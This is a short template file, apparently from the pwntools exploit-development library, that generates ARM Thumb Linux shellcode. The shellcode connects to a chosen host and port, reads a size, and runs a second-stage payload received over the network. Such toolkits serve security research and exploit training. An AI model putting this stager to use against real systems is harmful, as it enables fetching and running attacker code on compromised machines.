<% from pwnlib.shellcraft import common %>
<% from pwnlib.shellcraft.thumb import linux %>
<%docstring>
connect recvsize stager
Args:
    host, where to connect to
    port, which port to connect to
    network, ipv4 or ipv6? (default: ipv4)
</%docstring>
<%page args="host, port, network = 'ipv4'"/>

${linux.connect(host, port, network)}
${linux.recvsize('r6', 'r1')}
${linux.stager('r6', 'r1')}
